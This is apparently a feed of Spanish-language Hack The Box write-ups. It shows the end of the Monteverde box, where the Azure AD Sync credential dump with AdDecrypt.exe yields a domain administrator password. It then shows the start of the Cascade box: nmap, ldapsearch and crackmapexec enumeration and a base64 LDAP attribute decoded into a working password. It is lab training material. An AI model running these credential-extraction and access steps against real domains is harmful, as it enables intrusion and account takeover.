&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Desk&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir

    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;         1/3/2020   5:48 AM             32 &lt;span class=&quot;s2&quot;&gt;&quot;user.txt&quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a sacar la flag .txt&lt;/p&gt;

&lt;h1 id=&quot;microsoft-azure-ad-sync-privilege-escalation&quot;&gt;Microsoft Azure AD Sync Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Procedemos a enumerar el sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /all

USER INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;

User Name      SID
&lt;span class=&quot;o&quot;&gt;==============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt;
megabank&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

Group Name                                  Type             SID                                          Attributes
&lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt;
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
&lt;span class=&quot;s2&quot;&gt;&quot;MEGABANK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;zure Admins     &quot;&lt;/span&gt;                  Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;

Privilege Name                Description                    State
&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Explotacion del Grupo de Azure Admins:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Microsoft Azure AD Sync Privilege Escalation&quot;&lt;/span&gt;

https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/    &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Fuente de Info   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Comando a aplicar en la ruta en la que subimos los archivos

https://github.com/VbScrub/AdSyncDecrypt/releases  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Github descargar el .zip y descomprimirlo

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos descargamos los recursos y los descomprimimos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
AdDecrypt.exe  AdDecrypt.zip  mcrypt.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos subimos los archivos a la maquina en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;C:\Windows\Temp\Prueba\ ------------ &quot;&lt;/code&gt;
Nos desplazamos a esta ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&amp;gt; &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;AdDecrypt.exe -FullSQL&quot;&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Azure AD Sync&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rueba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dDecrypt.exe -FullSQL        &quot;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt;
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
&lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt;

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!
&lt;span class=&quot;s2&quot;&gt;&quot;
DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL &quot;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Conseguimos sacar la contraseña en texto claro del administrator
Procedemos a sacar la flag conectandonos con Evil-Winrm&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah! &lt;/span&gt;

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;Desktop/root.txt
12909612d25c8xxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Rooteada y concepto sobre el Grupo Azure Admins aprendido. K0H4ck =)&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="LDAP," /><category term="RPCCLIENT," /><category term="ASREPRoast" /><category term="Attack," /><category term="Crackmapexec," /><category term="Azure" /><category term="Admins" /><category term="Group," /><category term="Privesc" /><category term="Azure" /><category term="Admins," /><category term="Evil-WinRm," /><category term="Maquinas" /><category term="Retiradas" /><summary type="html">Cascade - AD Path ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/01/10/Cascade-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)" /><published>2022-01-10T00:00:00-03:00</published><updated>2022-01-10T00:00:00-03:00</updated><id>http://localhost:4000/2022/01/10/Cascade-AD</id><content type="html" xml:base="http://localhost:4000/2022/01/10/Cascade-AD.html">&lt;h1 id=&quot;cascade---ad-path--hack-the-box&quot;&gt;Cascade - AD Path ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.182       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-01-10 18:48:00Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: cascade.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-10T18:48:54
|_  start_date: 2022-01-10T14:55:16
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar los servicios tipicos encontrados como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; y vemos que no tenemos recursos compartidos si proporcionar Contraseña&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.182  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.182:445        Name: cascade.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a añadir al archivito &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano /etc/hosts&lt;/code&gt; el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dominio: cascade.local&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a listar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crackmapexec&lt;/code&gt; informacion sobre el equipo que nos enfrentamos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.182                          
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar el servicio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ldap&lt;/code&gt; atraves de uno de los scripts de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ldap* and not brute&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ldapScan 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Otra forma y la mas habitual es usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DC=cascade,DC=local&apos;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos que se nos lista muchisima informacion procedemos a grepear por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ Dominio de la Maquina&lt;/code&gt; para enumerar posibles usuarios a nivel del sistema.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DC=cascade,DC=local&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@cascade.local&quot;&lt;/span&gt;

userPrincipalName: CascGuest@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
userPrincipalName: util@cascade.local
userPrincipalName: j.wakefield@cascade.local
userPrincipalName: s.hickson@cascade.local
userPrincipalName: j.goodhand@cascade.local
userPrincipalName: a.turnbull@cascade.local
userPrincipalName: e.crowe@cascade.local
userPrincipalName: b.hanson@cascade.local
userPrincipalName: d.burman@cascade.local
userPrincipalName: BackupSvc@cascade.local
userPrincipalName: j.allen@cascade.local
userPrincipalName: i.croft@cascade.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahi tenemos unos potenciales usuarios a nivel de sistema para montarnos un diccionario y para intentar hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASREP-Roasting Attack&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a intentar listar un poco de informacion para cada usuario atraves de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; grepeando por el dominio ` -A 20 `&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DC=cascade,DC=local&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@cascade.local&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 20
......
userPrincipalName: &lt;span class=&quot;s2&quot;&gt;&quot;r.thompson&quot;&lt;/span&gt;@cascade.local
objectCategory: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Person,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cascade,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132863135972508376
msDS-SupportedEncryptionTypes: 0
&lt;span class=&quot;s2&quot;&gt;&quot;cascadeLegacyPwd:  &quot;&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Pwd ?¿ Password ?¿ 
......
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos fijandonos con nuestro Ojo de Lince una cadena en base64 que podria ser una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt; para el Usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.thompson&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;clk0bjVldmE=&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;                                                                                                 
&lt;span class=&quot;s2&quot;&gt;&quot;rY4n5eva&quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Password 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a chequear con crackmapexec la password para el user r.thompson&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; r.thompson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; rY4n5eva                                                                                 
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.182    445    CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] cascade.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;.thompson:rY4n5eva
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Chequeamos para ver si con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winrm&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; r.thompson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; rY4n5eva                                                                         
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] cascade.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;.thompson:rY4n5eva
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.thompson&lt;/code&gt; no pertenece al grupo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote Managment System&lt;/code&gt;
Procedemos a listar Recursos compartidos para el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.thompson&lt;/code&gt; a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.182  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; r.thompson  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; rY4n5eva                                                      

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
